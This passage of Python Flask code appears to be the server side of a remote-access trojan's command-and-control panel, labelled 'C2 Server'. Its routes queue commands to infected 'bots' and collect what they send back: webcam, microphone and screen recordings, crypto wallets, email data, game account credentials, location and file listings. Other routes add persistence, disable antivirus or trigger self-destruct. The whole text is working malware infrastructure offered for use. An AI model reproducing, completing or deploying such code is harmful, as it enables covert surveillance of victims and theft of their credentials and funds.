@app.route('/api/bot/<bot_id>/webcam/get')
@login_required
def get_webcam(bot_id):
    return jsonify(webcam_data.pop(bot_id, {}))

# Files
@app.route('/api/bot/<bot_id>/files', methods=['POST'])
@login_required
def req_files(bot_id):
    data = request.get_json()
    pending_commands[bot_id] = {'command': 'list_dir', 'path': data.get('path', 'C:\\\\')}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/files', methods=['POST'])
def recv_files():
    data = request.get_json()
    files_data[data['bot_id']] = data.get('data', {})
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/files/get')
@login_required
def get_files(bot_id):
    return jsonify(files_data.pop(bot_id, {}))

# Audio
@app.route('/api/bot/<bot_id>/audio', methods=['POST'])
@login_required
def req_audio(bot_id):
    data = request.get_json() or {}
    pending_commands[bot_id] = {'command': 'record_audio', 'duration': data.get('duration', 10)}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/audio', methods=['POST'])
def recv_audio():
    data = request.get_json()
    audio_data[data['bot_id']] = {'data': data.get('data', {})}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/audio/get')
@login_required
def get_audio(bot_id):
    return jsonify(audio_data.pop(bot_id, {}))

# Crypto
@app.route('/api/bot/<bot_id>/crypto', methods=['POST'])
@login_required
def req_crypto(bot_id):
    pending_commands[bot_id] = {'command': 'crypto_wallets'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/crypto', methods=['POST'])
def recv_crypto():
    data = request.get_json()
    crypto_data[data['bot_id']] = {'data': data.get('data', [])}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/crypto/get')
@login_required
def get_crypto(bot_id):
    return jsonify(crypto_data.pop(bot_id, {}))

# Email
@app.route('/api/bot/<bot_id>/email', methods=['POST'])
@login_required
def req_email(bot_id):
    pending_commands[bot_id] = {'command': 'email_data'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/email', methods=['POST'])
def recv_email():
    data = request.get_json()
    email_data[data['bot_id']] = {'data': data.get('data', [])}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/email/get')
@login_required
def get_email(bot_id):
    return jsonify(email_data.pop(bot_id, {}))

# Games
@app.route('/api/bot/<bot_id>/games', methods=['POST'])
@login_required
def req_games(bot_id):
    pending_commands[bot_id] = {'command': 'game_accounts'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/games', methods=['POST'])
def recv_games():
    data = request.get_json()
    games_data[data['bot_id']] = {'data': data.get('data', [])}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/games/get')
@login_required
def get_games(bot_id):
    return jsonify(games_data.pop(bot_id, {}))

# Location
@app.route('/api/bot/<bot_id>/location', methods=['POST'])
@login_required
def req_location(bot_id):
    pending_commands[bot_id] = {'command': 'get_location'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/location', methods=['POST'])
def recv_location():
    data = request.get_json()
    location_data[data['bot_id']] = {'data': data.get('data', {})}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/location/get')
@login_required
def get_location(bot_id):
    return jsonify(location_data.pop(bot_id, {}))

# Processes
@app.route('/api/bot/<bot_id>/processes', methods=['POST'])
@login_required
def req_processes(bot_id):
    pending_commands[bot_id] = {'command': 'list_processes'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/processes', methods=['POST'])
def recv_processes():
    data = request.get_json()
    processes_data[data['bot_id']] = {'data': data.get('data', {})}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/processes/get')
@login_required
def get_processes(bot_id):
    return jsonify(processes_data.pop(bot_id, {}))

# Apps
@app.route('/api/bot/<bot_id>/apps', methods=['POST'])
@login_required
def req_apps(bot_id):
    pending_commands[bot_id] = {'command': 'installed_apps'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/apps', methods=['POST'])
def recv_apps():
    data = request.get_json()
    apps_data[data['bot_id']] = {'data': data.get('data', {})}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/apps/get')
@login_required
def get_apps(bot_id):
    return jsonify(apps_data.pop(bot_id, {}))

# Screen Recording
@app.route('/api/bot/<bot_id>/screen', methods=['POST'])
@login_required
def req_screen(bot_id):
    data = request.get_json() or {}
    pending_commands[bot_id] = {'command': 'record_screen', 'duration': data.get('duration', 10), 'fps': data.get('fps', 5)}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/screen_record', methods=['POST'])
def recv_screen():
    data = request.get_json()
    screen_data[data['bot_id']] = {'data': data.get('data', {})}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/screen/get')
@login_required
def get_screen(bot_id):
    return jsonify(screen_data.pop(bot_id, {}))

# Persistence
@app.route('/api/bot/<bot_id>/persist/add', methods=['POST'])
@login_required
def req_persist_add(bot_id):
    pending_commands[bot_id] = {'command': 'add_persistence'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/<bot_id>/persist/remove', methods=['POST'])
@login_required
def req_persist_remove(bot_id):
    pending_commands[bot_id] = {'command': 'remove_persistence'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/persistence', methods=['POST'])
def recv_persist():
    data = request.get_json()
    persist_data[data['bot_id']] = {'data': data.get('data', {})}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/persist/get')
@login_required
def get_persist(bot_id):
    return jsonify(persist_data.pop(bot_id, {}))

# AV Disable
@app.route('/api/bot/<bot_id>/av/disable', methods=['POST'])
@login_required
def req_av_disable(bot_id):
    pending_commands[bot_id] = {'command': 'disable_av'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/av_disabled', methods=['POST'])
def recv_av():
    data = request.get_json()
    av_data[data['bot_id']] = {'data': data.get('data', {})}
    return jsonify({'status': 'ok'})

@app.route('/api/bot/<bot_id>/av/get')
@login_required
def get_av(bot_id):
    return jsonify(av_data.pop(bot_id, {}))

# Self Destruct
@app.route('/api/bot/<bot_id>/destruct', methods=['POST'])
@login_required
def req_destruct(bot_id):
    pending_commands[bot_id] = {'command': 'self_destruct'}
    return jsonify({'status': 'queued'})

@app.route('/api/bot/destruct', methods=['POST'])
def recv_destruct():
    data = request.get_json()
    return jsonify({'status': 'ok'})

# ==================== MAIN ====================

if __name__ == '__main__':
    load_bots()
    print(f"[*] Loaded {len(bots_data)} bots")
    print("[*] Starting C2 Server on http://0.0.0.0:3000")
    print("[*] Dashboard: http://localhost:3000")
    app.run(host='0.0.0.0', port=3000, threaded=True)
